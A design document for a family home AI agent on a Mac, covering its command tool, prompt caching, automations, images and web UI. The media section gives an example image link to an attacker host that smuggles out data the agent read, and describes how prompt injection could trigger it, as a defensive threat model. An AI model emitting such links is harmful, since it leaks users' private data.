# btw-agent design

A small agent that runs on one Mac and does things on it for a family. One gateway process serves
a web UI. Family members share **profiles**. Each profile has its own conversations, workspace
folder, skills and memory. The agent has a single tool, `run_command`.

## Decisions

| Area               | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Execution          | Commands run as the gateway's macOS user with full access to the disk and no approval step. There is no sandbox. The profile folder is only the default working folder. A "smart mode" that auto-approves or rejects commands may come later.                                                                                                                                                                                                                                                 |
| Clients            | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration).                                                                                                                                                                                                                                                                                                                                                                  |
| Exposure           | Public through a tunnel on a VPS. Every route requires login. The sign-up endpoint is disabled: accounts are created only with the local CLI, and passwords must be long and strong.                                                                                                                                                                                                                                                                                                          |
| Profiles           | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.btw-agent/trash/` instead of erasing it.                                                                                                                                                                                                                                                                                                              |
| Conversations      | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                                                |
| Sender identity    | Every human message is sent to the model as `Name: text`, with nothing else added but the paths of pictures attached to it. Display names are unique across the gateway.                                                                                                                                                                                                                                                                                                                      |
| Providers          | Anthropic only for now (API key). Model presets are global and managed by the admin with the CLI or the `/admin` page. A preset has a name (default `<model> (anthropic)`), a model, and an optional context-window override. One preset is the default (the oldest until an admin picks another): new chats start with it, and automations without a preset use it.                                                                                                                          |
| Preset switching   | Not allowed. A conversation keeps its provider and model for its whole life.                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once.                                                                                                                                                                                                                                                                                                                  |
| System prompt      | Built once when the conversation is created: instructions, the skills catalog and the contents of `MEMORY.md`. **It is never changed afterwards, and no update notices are added.** If memory or skills change in another conversation, this conversation only sees it by running commands.                                                                                                                                                                                                   |
| Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the skills that ship with btw (`packages/core/skills`: `automations`, `view-images` and `generate-images`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`. |
| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. The agent looks at pictures itself with `btw view`, which attaches them to that command's result. There is no tool for either.                                                               |
| Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                                                               |
| Making pictures    | The agent runs `btw generate image` (OpenAI's Image API, `gpt-image-2.5-flare` by default; each other provider would be one more module). Templates belong to the Images page, which turns one and its settings into a finished prompt in the message it sends; the CLI knows nothing about them.                                                                                                                                                                                             |

## Files on disk

```
~/.btw-agent/                 (override with BTW_HOME)
  config.json                 auth secret, Anthropic and OpenAI keys, image model, extra env vars
                              for commands (mode 600)
  btw.db                      SQLite: users, sessions, profiles, presets, conversations, messages,
                              media, triggers, trigger runs, notifications
  media/<sha256>              copies of the pictures and files shown in chats
  image-templates/<id>/       Images page templates for every profile (TEMPLATE.md, cover.png)
  bin/btw                     shim so the agent can run `btw` from any command
  profiles/<slug>/            default working folder for commands in this profile
    MEMORY.md
    skills/<name>/SKILL.md
    image-templates/<id>/     this profile's own templates
    uploads/<date>/           pictures people attached on the Images page
    images/                   what `btw generate image` made
  trash/<slug>-<timestamp>/   deleted profiles
~/.agents/skills/<name>/SKILL.md   global skills, visible to every profile
```

The folder name is a slug that is fixed when the profile is created. Renaming a profile changes
only its display name, so the skill paths already in system prompts stay valid.

Every skill is on in every profile until someone turns it off, on the profile's Skills page or with
`btw skill disable`. The profile stores the names it turned off (`profile.disabled_skills`), so skills
added later start out on. Skills that are off are left out of the catalog when a conversation is
created; conversations already running keep the catalog they started with.

## Prompt caching

The rule: **the request prefix must stay byte-identical, so history is only ever appended to.**

- Order of the request: `tools` (just `run_command`, a constant) → `system` (the conversation's saved
  copy) → `messages`. Editing the tool definition therefore costs every conversation one cache
  miss after the upgrade (adding `summary` and `icon` did).
- Each assistant response is stored as the exact `content` JSON the API returned, thinking blocks and
  their signatures included, and is sent back unchanged. Messages are never rebuilt from normalized
  columns. Command output is truncated once, when the tool result is created, and never later.
- Cache markers: `cache_control: {type: "ephemeral", ttl: "1h"}` on the system block, plus the same
  setting at the top level of the request (automatic caching of the growing tail). Both use 1h,
  because the API requires longer-TTL entries to come before shorter ones.
- The model, tool definition and system prompt are fixed per conversation. Thinking uses
  `adaptive` with `display: "summarized"`, the same for every conversation. The only per-conversation
  knob is `effort`.
- Steering messages, stop results and restart-recovery results are **appended** as new rows. Nothing
  is ever edited or deleted. Opus 5.5 and Fable 5.1 require this anyway for "preserved thinking":
  replaying a thinking block after its prefix changed returns a 400 on newer accounts.
- Every assistant row stores `usage`, and the gateway logs `cache_read` / `cache_write` and the hit
  rate for every call. The chat header shows the hit rate (tooltip: last reply and whole conversation),
  and a reply is marked as a cache miss when it read less than the previous call read or wrote, with
  the likely cause: over an hour idle (the TTL) or a changed request such as a new reasoning level.

## Agent loop

This is a hand-written loop over `client.messages.stream()` rather than the SDK's Tool Runner, because
each step must be saved to SQLite and resumed from there, including after a gateway restart.

```
kick(conversation):                     one loop per conversation at a time
  loop:
    commit queued human messages        (assigns seq; this is how steering happens)
    if the last committed row isn't a user row: stop
    stream a model call → append an assistant row
    if it contains tool_use blocks:
      run them one after another → append one user row with every tool_result
      (if stop_reason isn't tool_use, the calls are answered with "not run" instead)
```

- **Stop** aborts the stream (the partial reply is dropped, nothing is appended) or kills the running
  command's process group. Unfinished calls are answered with `Stopped by <name>.` Queued messages
  are committed without calling the model, and the next message continues the conversation.
- **API errors** leave the transcript ending on a user row. The UI then shows a **Continue** button,
  which calls `kick` again.
- **Gateway restart:** an assistant `tool_use` with no result gets an appended "interrupted" result,
  and conversations with queued messages are started again.
- Several consecutive user rows (for example tool results followed by steering texts) are sent as
  separate messages. The API merges them into one turn.

### `run_command`

- Input: `{summary, icon, command, cwd?, timeout_seconds?}`. Runs as `$SHELL -lc <command>`, so every
  call starts a fresh login shell and `cd` doesn't carry over between calls.
- `summary` (what the command does, in plain words and the conversation's language) and `icon` (a
  Lucide icon name) are only for the web UI, which shows them instead of the command. They come
  first in the schema so they stream in before the command. Required in the schema so the model
  always writes them, but a call without them still runs.
- Default timeout 120 s, maximum 1800 s. On timeout or Stop, the whole process group is killed.
  Background processes that a command detaches keep running.
- No stdin. `TERM=dumb`, `NO_COLOR=1`, `PAGER=cat`.
- Output is stdout and stderr interleaved, with ANSI codes removed, capped at 30 KB (the first 10 KB and
  the last 20 KB are kept), followed by an exit-code line. Images the command showed with `btw view`
  follow as image blocks (below).
- The environment is the gateway's own, minus its secrets (`ANTHROPIC_API_KEY`, `BETTER_AUTH_SECRET`, …),
  plus the `commandEnv` values from `config.json` (for example `FIRECRAWL_API_KEY`), plus
  `BTW_PROFILE`, `BTW_PROFILE_DIR`, `BTW_CONVERSATION_ID` and `BTW_VIEW_DIR`.
- `eager_input_streaming` is left off: the input is one short command, and leaving it off keeps the API's
  own input validation.

### Seeing images: `btw view`

The agent looks at an image by running `btw view <file>...`. There is no second tool: the images are
attached to that `run_command` call's `tool_result`, which may hold image blocks, so the tool
definition and every conversation's cache stay as they are. Like automations, nothing is added to
the system prompt beyond the skills catalog: the built-in `view-images` skill explains `btw view`,
and how to see what isn't a picture file yet (the screen, PDF pages, video frames, web pages),
crops for small print and contact sheets for many photos. A profile that turns the skill off
doesn't learn about `btw view`. Showing pictures to people is the other direction, in
[Pictures and files](#pictures-and-files).

- **Handoff.** Every call gets a fresh temp folder (`BTW_VIEW_DIR`) holding the conversation's
  remaining image allowance. `btw view` prepares each image, writes it there and adds a line to a
  manifest. After the command exits the gateway checks the files again, attaches them after the text
  output (each after an `Image: <path>` line), and deletes the folder. Not markers in stdout: output is
  cut at 30 KB, and `cat`-ing a file that contains one would attach an image nobody asked for.
- **Preparing** (`packages/core/src/images.ts`). JPEG, PNG, GIF and WebP up to 2000 px and 1.5 MB are
  sent as they are; JPEGs lose their EXIF and XMP segments (GPS positions, and an orientation that
  browsers apply but the model ignores). Everything else is converted with `sips` on macOS or
  ImageMagick elsewhere: at most 2000 px, turned upright, PNG when the source was PNG, GIF or WebP
  unless that's over 1.5 MB, otherwise JPEG. PDFs are refused.
- **Why 2000 px**, although newer models take 2576: a request with more than 20 images, the history
  included, rejects any image over 2000 px. History is never edited, so a larger image would break
  the conversation for good once it holds 21.
- **Limits.** 10 images per command. Per conversation 100 images and 20 MB of base64, because every
  request resends the whole history and is capped at 32 MB (and at 100 images on 200k-context
  models). Past a limit `btw view` fails with an explanation; nothing is dropped silently.
- Images are stored as base64 in the `tool_results` row like any other content and replayed
  byte-for-byte, so after the first call they're read from the cache.

## Making pictures

The agent makes pictures with `btw generate image`, a command like `btw view`: no new tool, nothing
in the system prompt beyond the skills catalog. The built-in `generate-images` skill explains it,
how to write prompts, and how to run the Images page's messages.

- **Providers** (`packages/core/src/image-generation.ts`). Models are named `<provider>/<model>`
  (`openai/gpt-image-2.5-flare`, the default; `btw config set image-model`). Each provider is one
  module with the same shape, registered in `PROVIDERS`: its key check, its qualities, how many
  input pictures it takes and which formats, and `generate`. `openai.ts` is the only one today:
  `/v1/images/generations` for a prompt, `/v1/images/edits` (multipart) when pictures are given,
  with plain `fetch` rather than the SDK. OpenRouter, fal or Higgsfield would each add a module;
  shapes (`square`, `portrait`, `landscape`, `auto`) are provider-neutral and each module maps them
  to its own sizes.
- **Keys** live in `config.json` (`btw key set openai`), with `OPENAI_API_KEY` as a fallback, and
  are read by the CLI, so the gateway itself never calls the image API. `OPENAI_BASE_URL` points it
  at a proxy or a compatible server, as in OpenAI's SDKs.
- **Input pictures.** PNG, JPEG and WebP are sent as they are (JPEGs without EXIF, which carries GPS
  positions); other formats, sideways photos and files over 25 MB go through `btw view`'s converter.
- **Output** goes to the profile's `images/` folder (or `--out`), and the command prints a `Saved
<path>` line per picture, which the agent shows with `![...](path)` like any other picture.
- It checks everything (key, options, input files) before saying it has started, and a request
  times out after 5 minutes; the skill tells the agent to allow 300 s.

### Templates and the Images page

The Images page (sidebar, `/p/<slug>/images`) is a grid of templates in tabs (Templates,
Trending, then any other category), like ChatGPT's. Picking one opens a dialog: the picture it
starts from (most need one), its settings as chips or text fields, the shape and "Anything
else?". Generate starts a new chat (default model, reasoning `low`, titled after the template)
whose first message holds the picture and the finished prompt. A text box below the grid
("Describe an image", with a paperclip) does the same with the person's own words.

- **A template** is a folder with a `TEMPLATE.md`: YAML frontmatter (name, description, category,
  a Lucide `icon` and hex `color` for its card, whether it needs a picture, the default shape,
  quality, background and format, and its settings: `options` with a label and the `prompt`
  fragment each stands for, or free text), then the prompt. `{{setting}}` is replaced by the
  choice, `{{#setting}}…{{/setting}}` is kept only when it has a value and `{{^setting}}…{{/setting}}`
  only when it doesn't; `{{#image}}` tests whether a picture was given. A line that held only
  sections that were left out disappears. An option can also switch the background (a pixel-art
  sprite is transparent, a scene isn't). A `cover.png|jpg|webp` next to it replaces the icon.
- **Sources**, like skills: the 14 that ship with btw (`packages/core/image-templates`),
  `~/.btw-agent/image-templates`, and the profile's `image-templates` folder; a later one
  overrides an earlier one with the same id.
- **The message** is plain text the family reads in the chat, e.g.

  ```
  Make an image with the Poster template.
  Size: portrait
  Quality: high

  Prompt:
  Design a striking printed poster, ready to hang on a wall. …
  ```

  The skill tells the agent to pass the prompt unchanged on stdin (a heredoc, so quotes can't
  break the command) and the option lines as flags. Templates are therefore only the page's
  business: `btw generate image` takes a prompt and pictures, whoever wrote them.

- **Attached pictures** are saved in the profile's `uploads/<date>/` (names made shell-safe), where
  the agent can use them like any file, and copied into the media store with `media` rows on the
  human message, so the chat shows them above the bubble even if the file moves. The model sees
  one `Attached: <path>` line per picture after the text, not the picture itself: the image model
  gets it directly, and the agent can `btw view` it when the request depends on it. At most 4
  pictures of 25 MB each; anything that isn't a picture is refused and nothing is kept.
  `btw start` raises adapter-node's body limit (512 KB) to fit them; requests without a login are
  refused before their body is read.

## Automations

Triggers run the agent without anyone sending a message. What they find goes to notifications, not
into conversations.

- **Trigger** (per profile). _When_: a 5-field cron expression in the gateway's local time zone, a
  one-time `runAt`, or a webhook: `POST /api/hooks/<secret token>` with a JSON body (64 KB max;
  SvelteKit's cross-site check refuses form-encoded and text/plain bodies in production). _What_:
  a prompt for the agent, or a shell command that runs without the model. Script triggers make
  polling cheap: the script checks the email, the price or the page, and runs
  `btw wake "<what happened>"` only when the agent is needed.
- **Who sets them up:** the agent, with the `btw trigger` command. There is no new tool and nothing
  in the system prompt beyond the skills catalog: the built-in `automations` skill explains
  `btw trigger` and `btw wake`, and is read only when someone asks for a reminder or a check. Members
  see, edit, run, pause and delete them on the profile's Automations page. There is no create form.
- **The Automations page** is for the family, not the agent. Each trigger shows its `icon` and a
  one-sentence `summary` (written by the agent with `--summary` / `--icon`, like `run_command`'s),
  its schedule in plain words (`describeCron`: "Every weekday at 07:30"; the cron itself only with
  technical details on) and relative times ("next Monday at 07:30"). The prompt, script and webhook
  URL are behind Edit. Above the list, a month calendar (whole weeks, Monday first, `?month=`
  to page) shows an icon per trigger on each day and the chosen day's list below it: before now,
  what ran and how it went (agent runs, and failed scripts once a day; runs are kept 30 days, so
  it goes back no further), after now, what the schedule will run. A trigger firing more than 4
  times a day on average is listed once above the grid instead.
- **Runs.** Every firing (schedule, webhook, `btw wake`, Run now) inserts a `pending` row in
  `trigger_run`. The gateway's scheduler ticks every 5 s: it fires triggers whose `nextRunAt` has
  passed and starts pending runs. The CLI only writes rows, so `btw wake` from a script is picked up
  within a tick. At most 3 agent runs go at once, a script trigger runs one at a time, and a
  scheduled firing is skipped while the trigger's previous run of the same kind is unfinished.
- **Missed firings** (Mac asleep, gateway down) collapse into one catch-up run, because the next time
  is computed from when the trigger actually fired.
- **Agent runs** happen in a hidden conversation (`conversation.hidden`) through the normal runner.
  Its first row has kind `trigger`: the model sees `[Automation "<name>" · <why> · <time>]`, the
  prompt, the webhook body, and instructions to keep the final reply short or answer only
  `NO_NOTIFICATION`. The system prompt is the ordinary one, so runs share the profile's cached prefix.
- **Finishing.** When a run's loop ends (`onLoopEnd`): an API error becomes an error notification, a
  final reply becomes a notification with that text, `NO_NOTIFICATION` on the last line (or no text)
  is recorded as `silent`, and a run someone stopped is `stopped`. None of these notify twice.
- **Script runs** execute like `run_command` (login shell, profile folder, the same environment plus
  `BTW_TRIGGER_ID` and `BTW_PAYLOAD`) with a 10-minute timeout, keeping the last 4 KB of output. A
  failing script notifies once, when it starts failing, not on every run.
- **Notifications** belong to the profile, like conversations. Dismissing is per person
  (`notification_dismissal`), and unread means newer than when that person last opened the menu
  (`notification_seen`). The bell listens on `/api/notifications/events` (SSE) and reloads on change.
- **Continue in chat** unhides the run's conversation, which moves into the sidebar with its whole
  transcript; sending a message into a hidden run does the same. A notification without a
  conversation (script failures, or the run was deleted) starts a new conversation whose first
  reply is the notification text.
- **After a restart**, agent runs that were in progress continue (the interrupted command gets the
  usual "restarted" result) and script runs in progress are marked failed.
- **Retention:** finished runs, notifications and hidden conversations are deleted after 30 days, and
  only the last 100 runs of each trigger are kept.

## Pictures and files

The agent shows a picture by writing a Markdown image, `![what it shows](path)`, and hands over a
file by linking it, `[Tax form](path)`. The system prompt explains this (so only conversations
created since know it). There is no new tool and the reply's `content` is never touched, so the
cached prefix doesn't change.

- **What counts** (`@btw/core/media-refs`): images whose target is a path on the computer (absolute,
  `~/…`, relative to the profile folder, or `file://`) or an http(s) URL, and links whose target is
  a path. Links to web pages stay links. It reads the text with marked's lexer, so code spans and
  code blocks are skipped, and the browser renders with the same file, so both agree.
- **Copied when the reply is saved.** After a model call, before appending its row, the runner copies
  every target into `~/.btw-agent/media/<sha256>` in its original size and bytes (remote pictures are
  downloaded, with a 30 s timeout), then appends the row and one `media` row per target in the same
  transaction. The chat keeps showing a picture after the original is moved, edited or was a
  temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
  on screen meanwhile; Stop aborts the copying.
- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
  picture is downloaded only if its exact link appears earlier in the conversation, in what a
  person wrote, an automation's prompt or event, or a command's output: the agent found the link
  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
  "Web pictures are shown only when btw found the link on a page or in a message", and the system
  prompt tells the agent to download other pictures and show the file. This narrows the channel
  rather than closing it: a reply can still choose which of the links it found to show, and a
  command can print any link, but an agent that runs commands can already send anything with
  `curl`.
- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
  address checked is the one connected to (a name can't resolve to a public address for the check
  and a local one for the connection). IP addresses in a link are checked before connecting, and
  each redirect (up to 5) goes through the same checks.
- **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
  target that can't be copied gets a row with the reason in plain words (not found, a folder, too
  large, not a picture, a web link the agent didn't find, a local-network address, the download
  failed), which the chat shows in its place.
- **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
  (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
  download is still the original. Elsewhere they are shown as downloads. Width and height (with
  EXIF rotation applied) are read from the file header, so the chat reserves the space before a
  picture loads and stays scrolled to the bottom.
- **Serving:** `GET /api/c/<conversation>/media/<id>` checks that the user belongs to the
  conversation's profile and serves the copy by its random id; it never takes a path. Pictures are
  sent inline and everything else as an attachment; `?download` sends the original. Responses
  carry `nosniff`, a sandboxing CSP (an SVG opened in its own tab can't run script) and an
  immutable cache header.
- **The chat only loads btw's copies.** The Markdown renderer swaps each target for its copy: a
  picture (click to open a viewer with a Download button), a download card for files and for
  pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
  DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
  images, so the browser never loads anything a reply names from another site without a click. The
  gateway's own downloads are what the two rules above guard.
- **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
  files that no row points to any more and that are over an hour old (so a copy about to be saved
  is safe). Identical files are stored once.
- The notification menu shows pictures as `[their description]` and file links as their label.

## Web UI

It follows the ChatGPT app: a sidebar with chats, a centered column of messages, and a rounded
composer. Most of the family doesn't read shell, so the default view hides the machinery.

- **Components** are [shadcn-svelte](https://shadcn-svelte.com) (Luma style, neutral base) in
  `src/lib/components/ui`, generated by its CLI and owned by the repo; `components.json` records the
  settings. Colors are CSS variables in `src/routes/layout.css`, with a dark theme
  (`mode-watcher`: system, light or dark).
- **Replies** are built by `buildTranscript` (`src/lib/transcript.ts`): text blocks are shown as
  Markdown (`marked` + DOMPurify), and every run of thinking and commands between two texts is one
  collapsible group, "Worked for 12s" when done and a live "Thinking" / current step while running.
  Durations come from row timestamps, so they're approximate.
- **Steps** show the `summary` and `icon` the model wrote with each `run_command` call ("Checking
  tomorrow's weather in Berlin" with `cloud-sun-rain`), in the conversation's language. Opening a
  step shows the command and its output. Calls from before summaries existed say "Ran a command".
  Any Lucide icon works: `/api/icons/<name>` serves one icon's drawing from the `lucide` package, so
  pages don't download all two thousand; unknown names fall back to a terminal icon.
- **Technical details** (Settings, per device, in the `btw-prefs` cookie so the server renders it
  too) switch the labels to the raw commands and add context size, prompt-cache hit rate, cache
  misses, per-reply token usage and the model name. "Always show steps" opens the groups by default.
- **New chat** is the empty composer: the first message creates the conversation and is sent in
  the same request. Model and reasoning are picked from the chip in the composer: the model starts
  at the default preset, reasoning at the level last used on this device. In an existing chat only
  reasoning can change.
- `/` redirects to the last profile opened (`btw-profile` cookie) or the only one, else to
  `/profiles`.

## Code layout

```
packages/core   @btw/core. Schema + migrations, config, skills, prompt, run_command, btw view images,
                Anthropic call, runner, media, uploads, users/profiles/presets, triggers, scheduler,
                notifications, image generation (providers: openai.ts) and image templates.
                Built-in skills in packages/core/skills, built-in templates in
                packages/core/image-templates. Plain TypeScript run by Node with type stripping (no
                enums or parameter properties; imports use .ts extensions).
packages/cli    btw: setup, start, service, config, key, env, user, preset, profile, skill, trigger, wake,
                view, generate
src/            SvelteKit gateway (adapter-node). @btw/core is bundled into the server build.
                UI components in src/lib/components (shadcn-svelte primitives in ui/).
scripts/        build-cli.mjs bundles the CLI and core into dist/cli.js with esbuild.
```

Core finds the package root by walking up to the `package.json` named `btw-agent`. That works
from source, from the SvelteKit build and from the bundled CLI, and gives the paths to the
migrations, `build/index.js` and the CLI entry.

## Distribution

Published to npm as `btw-agent` (not yet). `npm install -g btw-agent` gives the `btw` command.

- The package ships `build/` (the web app), `dist/cli.js`, `packages/core/drizzle`, the built-in
  skills in `packages/core/skills` and the built-in image templates in
  `packages/core/image-templates`. Its only
  runtime dependency is `better-sqlite3` (a native module with prebuilt binaries). Everything else is
  bundled. Node won't strip types inside `node_modules`, which is why the CLI ships as JavaScript.
- `btw setup` is the first-run wizard: config, API key, admin account, default preset, public URL.
- `btw start` reads host, port and origin from `config.json` (default `127.0.0.1:5780`), sets
  `HOST` / `PORT` / `ORIGIN` for adapter-node and imports `build/index.js`.
- `btw service install` writes a LaunchAgent (`~/Library/LaunchAgents/dev.btw-agent.gateway.plist`)
  that runs `node dist/cli.js start` with `KeepAlive` and logs to `~/.btw-agent/logs/gateway.log`.
  It's a LaunchAgent, not a LaunchDaemon, so commands run as the user. It records the absolute
  node path, so switching Node versions needs a reinstall.
- On shutdown, the gateway kills the process groups of commands that are still running.
- Remote access is the user's tunnel (Tailscale Funnel, Cloudflare Tunnel, a VPS). The gateway only
  binds to localhost by default.
- macOS privacy (TCC): the background `node` process needs Full Disk Access to reach Documents,
  Desktop, Photos and Mail. Setup prints the path. Granting it applies to everything that node
  binary runs.

## Not done yet

- **Compaction.** The context window is already stored on each conversation and shown in the UI.
  The next step is server-side compaction (beta `compact-2026-01-12`), triggered at about 85% of the
  window.
- Other providers (OpenRouter, ChatGPT). Each will get its own adapter and keep history in its own format.
- Other image providers (OpenRouter, fal, Higgsfield): a module each next to `openai.ts` and an entry
  in `PROVIDERS`, plus a `btw key set` name.
- Attaching pictures in ordinary chats. Uploads and attachments already work; only the chat's
  composer lacks the paperclip.
- Smart approval mode.
- Refusal fallbacks (`fallbacks: "default"`) for models that support them. Refusals are shown in the UI today.
- Push notifications (Web Push) for the bell. Today it only updates while a page is open.
- A `btw notify` command for scripts that only need to say something, without waking the agent.
